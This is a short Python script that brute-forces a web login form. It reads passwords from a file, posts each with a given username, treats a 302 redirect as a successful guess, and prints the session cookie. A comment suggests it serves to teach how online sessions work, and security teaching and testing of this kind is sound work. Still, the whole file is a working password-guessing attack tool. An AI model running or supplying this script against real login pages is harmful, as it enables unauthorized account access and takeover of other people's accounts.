import requests
import sys


def main():
    # Ensure that the proper arguments are provided
    if len(sys.argv) != 3:
        print("Please include the URL to the login page and a correct username")
        return
    # Retrieve URL and username from the command-line arguments
    url = sys.argv[1]
    username = sys.argv[2]
    session = requests.session()
    # Open passwords file for reading
    passwords = open('passwords.txt', 'r')
    # Iterate through passwords
    for password in passwords:
        # Remove newline from password
        password = password.split()[0]
        # Send login request with password and provided username. DO NOT ALLOW REDIRECTS 
        response = session.post(url, data={'username':username, 'password':password}, allow_redirects=False)
        # Print response code
        print(f"{username}:{password}  ->  {response.status_code}")
        # If we get a 302 Redirect response, we correctly guessed the password
        if response.status_code == 302:
            print(f"--- RECEIVED A REDIRECT ---")
            # Print the session cookie to show how online sessions work
            print(f"Session cookie: {session.cookies['session']}")
            break


if __name__ == "__main__":
    main()